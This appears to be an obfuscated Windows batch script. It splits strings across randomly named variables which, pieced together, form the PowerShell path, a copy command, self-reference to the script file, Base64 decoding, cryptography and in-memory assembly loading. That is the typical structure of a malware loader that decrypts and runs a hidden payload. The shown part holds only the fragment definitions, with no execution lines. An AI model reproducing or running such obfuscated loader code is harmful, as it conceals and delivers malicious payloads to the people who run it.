@echo off
set "ZHCnqpZVsO=0\"
set "YiVyLaHxGx=Wi"
set "ceLiGJBrkY=\v"
set "jHDhMAozlz=we"
set "KrDXqpwpxF=32"
set "NiwYSZMpcX=we"
set "rsKjxCOsOs=py"
set "TiFNPCQUbi=do"
set "EtETJBNDWR=:\"
set "ipzgYXFaZE=ll"
set "kagBPhiaky=xe"
set "ITmabvtdys=\W"
set "tVJqgYOQAW=ow"
set "IvNBOVBfRF= C"
set "RjhAipAHXY=he"
set "iDIXQQuAuV=Po"
set "lKmshMxYTy=po"
set "UtRsycyFrN=st"
set "NddJqjGtLD=nd"
set "dCmKuUsBTN= /"
set "JGZvNuWkcr=he"
set "PlwWuzzpPO=s\"
set "lRXJHBHhpQ=em"
set "ndyuSApUDz=Sy"
set "FuUzyUaBVK=co"
set "CCkAJRkEuq=ll"
set "fiCkdaAdZw=1."
set "CKSurJIJOM=.e"
set "aTXcCvfPMq=in"
set "lXdBPYNFee=y "
set "wCbCEvCxRr=rs"
set "FjiLerEWHm=ws"
set "FzbqMRLlXk=rS"
set "ryWzIQrWpN= %~dp0"
set "mnjxSBEhYH=cd"
set "fWenTXvNlB=rity"
set "upgUEwlFNe=)))"
set "gtZRImDzrP=$VHd"
set "dnmnvMbLhH=ay()"
set "ZgRRWccPzr=c = "
set "nWDrbjucsF=.Ass"
set "zPSKXBXKIb=('%~f0'"
set "oCwrihivlP=, $k"
set "rRvOzIRjRa=.Mem"
set "ctiJmTzQjF=embl"
set "EHvXTozdGj=pose"
set "bgwJAcLwlc=ment"
set "VtuEMjMHod=16] "
set "ZyzGbqNQhV=ssHd"
set "LxPbLchYDo=So, "
set "sVZAcyQJgq=;$ss"
set "caLCVtWXFV=vj0m"
set "lQSwzcgAQA= '')"
set "FwzqjvXasP=.Sec"
set "TVYvOLnUhF= '')"
set "TZWsEPSbEi=[Sys"
set "RMIYkliowL=grap"
set "YfIjSVnVzE=::('"
set "UOOaFXNWmA=.Len"
set "rfMgfWeaHt=);$s"
set "EQWTprieEx=Star"
set "urVVitAQvu=morF"
set "sarEQFZXaG=$smW"
set "fOXCisaoNW=ert]"
set "MzHoVumPvw=ss -"
set "nddZXRpfzT=pose"
set "ynZDVohCUk='gni"
set "oAaGZuhQdV=e = "
set "SvrkYLxJJJ=y.Ci"
set "NHBGhmuiqx=6] -"
set "yZqksJakse='[-1"
set "JTQZTkySdY=y.Pa"
set "WWEcIWPfgf=7Yiv"
